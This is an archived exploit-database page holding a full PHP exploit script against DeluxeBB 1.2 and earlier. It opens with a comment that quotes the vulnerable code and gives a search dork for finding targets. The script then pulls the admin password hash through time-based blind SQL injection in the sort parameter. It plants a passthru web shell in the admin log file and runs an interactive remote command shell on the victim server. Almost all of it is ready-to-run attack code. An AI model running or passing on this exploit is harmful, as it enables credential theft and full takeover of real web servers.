<html><head><title>DeluxeBB <= 1.2 Multiple Remote Vulnerabilities Exploit</title></head><pre>&lt;?php

/*
	-------------------------------------------------------
	DeluxeBB &lt;= 1.2 Multiple Remote Vulnerabilities Exploit
	-------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.deluxebb.com/
	dork.....: allintitle: powered by DeluxeBB

	[-] Blind SQL injection (BENCHMARK() method) in /forums.php
	
	108.	if(!$sort) {
	109.		$sort = 'DESC';
	110.	} elseif($sort=='ASC' || $sort=='DESC') {
	111.		$add .= '&amp;sort='.$sort;
	112.	}
	113.	
	114.	//calculating pages and navigation
	115.	$current_count = 0;
	116.	$tppt = $settings['tppt'];
	117.	
	118.	//caching censors
	119.	if($settings['censors']!=0) {
	120.		bbcodecache();
	121.	}
	122.	
	123.	//forum info
	124.	$rows = $db-&gt;query(&quot;SELECT COUNT(tid) FROM &quot;.$prefix.&quot;threads WHERE (lastpostdate&gt;='$posttime' &amp;&amp; fid='$fid')&quot;);
	125.	$nrows = $db-&gt;result($rows);
	126.	
	127.	$pageinfo = multipage($nrows, $page, $settings['tppf'], &quot;forums.php?fid=$fid&quot;);
	128.	
	129.	include($templatefolder.'/forums_header.dtf');
	130.	
	131.	//get and format all threads
	132.	$threads = $db-&gt;query(&quot;SELECT t.*,u.username FROM &quot;.$prefix.&quot;threads t LEFT JOIN &quot;.$prefix.&quot;users u ON (t.author=u.uid) 
		WHERE (t.fid='$fid' &amp;&amp; t.lastpostdate&gt;='$posttime') ORDER BY t.pinned $sort,t.lastpostdate $sort LIMIT $pageinfo[0], $pageinfo[1]&quot;);
			
	$sort variable isn't properly sanitised, so an attacker could be inject (with MySQL &gt;= 4.1 that
	allows subqueries) SQL code in a subquery after 'ORDER BY' statement, in the query at line 132

	[-] PHP injection by privilege escalation in /admincp.php
	
	29.	if($settings['cplog']==1 || $logs==1) {
	30.		$time = time();
	31.		$dir = $settings['logpath'];
	32.		@chmod($dir.'/cp.php', 0777);
	33.		$string = $_COOKIE['membercookie'].&quot;|##|$ip|##|$time|##|$REQUEST_URI\n&quot;;
	34.		$filehandle=@fopen($dir.'/cp.php',&quot;a&quot;);
	35.		if(!$filehandle) {
	36.			message($lang_wrongfilepermission, $lang_plschmod);
	37.		}
	38.		@flock($filehandle, 2);
	39.		@fwrite($filehandle, $string);
	40.		@fclose($filehandle);
	41.	}	
	
	with admin credentials, an attacker could be inject PHP code into cp.php log file by $REQUEST_URI
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function getmicrotime()
{ 
	list($usec, $sec) = explode(&quot; &quot;, microtime()); 
	return ((float)$usec + (float)$sec); 
}

function getdelay($query)
{
	global $host, $path;
	
	$query  = urlencode($query);
	$packet = &quot;GET {$path}forums.php?fid=1&amp;sort={$query} HTTP/1.0\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;Connection: close\r\n\r\n&quot;;
	$start = getmicrotime()*1000;
	http_send($host, $packet);
	$end = getmicrotime()*1000;

	return ($end - $start);
}

function normaldelay()
{
	global $count, $prefix, $uid;
	
	$sql = &quot;,(SELECT pass FROM {$prefix}_users WHERE uid={$uid} AND RAND(IF(1=0,BENCHMARK({$count},MD5(1)),0)))/*&quot;;
	$d1 = getdelay($sql);
	$d2 = getdelay($sql);
	$d3 = getdelay($sql);
	$m = ($d1 + $d2 + $d3) / 3;
	
	return (intval($m));
}

function benchmarkdelay()
{
	global $count, $prefix, $uid;
   
	$sql = &quot;,(SELECT pass FROM {$prefix}_users WHERE uid={$uid} AND RAND(IF(1=1,BENCHMARK({$count},MD5(1)),0)))/*&quot;;
	$d1 = getdelay($sql);
	$d2 = getdelay($sql);
	$d3 = getdelay($sql);
	$m = ($d1 + $d2 + $d3) / 3;
	
	return (intval($m));
}

function getuserinfo($uid)
{
	global $host, $path;
	
	$packet = &quot;GET {$path}misc.php?sub=profile&amp;uid={$uid} HTTP/1.0\r\n&quot;;
	$packet.= &quot;Host: {$host}\r\n&quot;;
	$packet.= &quot;Connection: close\r\n\r\n&quot;;
	preg_match_all(&quot;/&lt;span class=\&quot;misctext\&quot;&gt;(.*)&lt;\/span&gt;/&quot;, http_send($host, $packet), $split);
	
	return $split[1];
}

print &quot;\n+-----------------------------------------------------------------+&quot;;
print &quot;\n| DeluxeBB &lt;= 1.2 Multiple Remote Vulnerabilities Exploit by EgiX |&quot;;
print &quot;\n+-----------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......:	php $argv[0] host path [options]\n&quot;;
	print &quot;\nhost.......:	target server (ip/hostname)&quot;;
	print &quot;\npath.......:	path to DeluxeBB directory (example: / or /deluxebb/)\n&quot;;
	print &quot;\n-h hash....:	MD5 hash of admin (to find with SQL injection)&quot;;
	print &quot;\n-d delay...:	delay for BENCHMARK() (dafault: 500000)&quot;;
	print &quot;\n-u uid.....:	id of an admin user (default: 1)&quot;;
	print &quot;\n-t prefix..:	table's prefix (default: deluxebb)\n&quot;;
	print &quot;\nExample....:	php $argv[0] localhost /deluxebb/ -d 250000 -t my_prefix&quot;;
	print &quot;\nExample....:	php $argv[0] localhost / -h 098f6bcd4621d373cade4e832627b4f6 -u 5\n&quot;;
	die();
}

$host	= $argv[1];
$path	= $argv[2];

$opt	= array(&quot;-h&quot;, &quot;-d&quot;, &quot;-u&quot;, &quot;-t&quot;);
$md5	= &quot;&quot;;
$count	= &quot;500000&quot;;
$uid	= &quot;1&quot;;
$prefix = &quot;deluxebb&quot;;

for ($i = 3; $i &lt; $argc; $i++)
{
	if ($argv[$i] == &quot;-h&quot;) if (isset($argv[$i+1]) &amp;&amp; !in_array($argv[$i+1], $opt)) $md5 = $argv[++$i];
	if ($argv[$i] == &quot;-d&quot;) if (isset($argv[$i+1]) &amp;&amp; !in_array($argv[$i+1], $opt)) $count = $argv[++$i];
	if ($argv[$i] == &quot;-u&quot;) if (isset($argv[$i+1]) &amp;&amp; !in_array($argv[$i+1], $opt)) $uid = $argv[++$i];
	if ($argv[$i] == &quot;-t&quot;) if (isset($argv[$i+1]) &amp;&amp; !in_array($argv[$i+1], $opt)) $prefix = $argv[++$i];	
}

if (!strlen($md5))
{
	print &quot;\n[-] Testing delay time...&quot;;
	$ndelay = normaldelay();
	$adelay = $ndelay * 3;
	print &quot;\n[-] Normal delay: {$ndelay} ms&quot;;
	$bdelay = benchmarkdelay();
	print &quot;\n[-] Benchmark delay: {$bdelay} ms (this value must be greater then {$adelay} ms)\n&quot;;
	
	$user_info = getuserinfo($uid);
	print &quot;\n[-] Username: {$user_info[1]}&quot;;
	if (strtolower($user_info[3]) != &quot;head admin&quot;) die(&quot;\n\n[-] '{$user_info[1]}' is not admin!\n&quot;);

	$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
	$index = 1; $md5 = &quot;&quot;;
	print &quot;\n[-] MD5 Hash: &quot;;
	
	while (!strpos($md5, chr(0)))
	{
		for ($i = 0, $n = count($hash); $i &lt;= $n; $i++)
		{
			if ($i == $n) die(&quot;\n\n[-] Exploit failed...\n&quot;);
			$sql = &quot;,(SELECT pass FROM {$prefix}_users WHERE uid={$uid} AND RAND(IF((ORD(SUBSTR(pass,{$index},1))={$hash[$i]}),BENCHMARK({$count},MD5(1)),1)))/*&quot;;
			if (getdelay($sql) &gt; $adelay) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
		}
	
		$index++;
	}
	
	if (!eregi(&quot;[0-9,a-f]{32}&quot;, $md5)) die(&quot;\n\n[-] Invalid MD5 hash...\n&quot;);
}
else
{
	$user_info = getuserinfo($uid);
	print &quot;\n[-] Username: {$user_info[1]}\n[-] MD5 Hash: {$md5}&quot;;
	if (strtolower($user_info[3]) != &quot;head admin&quot;) die(&quot;\n\n[-] '{$user_info[1]}' is not admin!\n&quot;);
}
	
print &quot;\n\n[-] Trying to inject PHP code with admin credentials...\n&quot;;

$code	= &quot;&lt;?php;\${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)}?&gt;&quot;;
$packet = &quot;GET {$path}admincp.php?{$code} HTTP/1.0\r\n&quot;;
$packet.= &quot;Host: {$host}\r\n&quot;;
$packet.= &quot;Cookie: memberid={$uid}; membercookie={$user_info[1]}; memberpw={$md5}\r\n&quot;;
$packet.= &quot;Connection: close\r\n\r\n&quot;;
http_send($host, $packet);

$packet = &quot;GET {$path}logs/cp.php HTTP/1.0\r\n&quot;;
$packet.= &quot;Host: {$host}\r\n&quot;;
$packet.= &quot;Connection: close\r\n\r\n&quot;;
$html	= http_send($host, $packet);

if (!ereg(&quot;_code_&quot;, $html)) die(&quot;\n[-] Exploit failed...\n&quot;);
else print &quot;[-] Shell injected! Starting it...\n&quot;;

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

while(1)
{
	print &quot;\ndeluxebb-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$packet = &quot;GET {$path}logs/cp.php HTTP/1.0\r\n&quot;;
		$packet.= &quot;Host: {$host}\r\n&quot;;
		$packet.= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
		$packet.= &quot;Connection: close\r\n\r\n&quot;;
		$html   = http_send($host, $packet);
		if (!ereg(&quot;_code_&quot;, $html)) die(&quot;\n[-] Exploit failed...\n&quot;);
		$shell = explode(&quot;_code_&quot;, $html);
		print &quot;\n&quot;.$shell[1];
	}
	else break;
}

?&gt;

# milw0rm.com [2008-05-05]</pre></html>